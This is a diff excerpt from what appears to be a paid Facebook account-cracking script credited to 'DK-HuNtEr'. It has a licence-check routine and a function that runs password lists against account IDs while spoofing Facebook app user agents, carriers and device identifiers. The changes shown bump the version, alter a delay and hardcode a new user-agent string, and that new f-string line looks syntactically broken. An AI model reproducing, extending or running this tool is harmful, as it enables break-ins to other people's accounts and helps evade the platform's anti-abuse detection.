@@ -593,7 +593,7 @@ logo=(f"""
 \033[1;33m[\033[1;33m•\033[1;33m] \033[1;33mFacebook \033[1;37m :   \033[1;33m Reborn Beb
 \033[1;35m[\033[1;35m•\033[1;35m] \033[1;35mGithub   \033[1;37m :   \033[1;35m DK-HuNtEr
 \033[1;31m[\033[1;31m•\033[1;31m] \033[1;31mTool     \033[1;37m :   \033[1;31m PREMIUM
-\033[1;32m[\033[1;32m•\033[1;32m] \033[1;32mVersion   \033[1;37m:   \033[1;32m 4.5
+\033[1;32m[\033[1;32m•\033[1;32m] \033[1;32mVersion   \033[1;37m:   \033[1;32m 4.6
 \033[1;31m----\033[1;32m----\033[1;33m----\033[1;34m----\033[1;35m----\033[1;36m----\033[1;31m----\033[1;32m----\033[1;33m----\033[1;34m----\033[0;m""")
 #---------------------------[Approval System]----------------------------#
 def dark():
@@ -606,7 +606,7 @@ def dark():
     xxx = requests.get('https://github.com/DK-HuNtEr/Trick/blob/main/trick.txt').text
     if id in xxx:
       msg = str(os.geteuid())
-      time.sleep(0.5)
+      time.sleep(0.6)
       pass
     else:
       print(f'\033[1;31m[\033[1;31m•\033[1;31m] \033[1;31m15 DAY 300 NPR ')
@@ -942,7 +942,7 @@ def api1(ids,names,passlist):
                                 fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                 fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                 fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
-                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBPN/{fbpn};FBDV/RMX3617;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
+                                ua = f"[[FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]]"
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
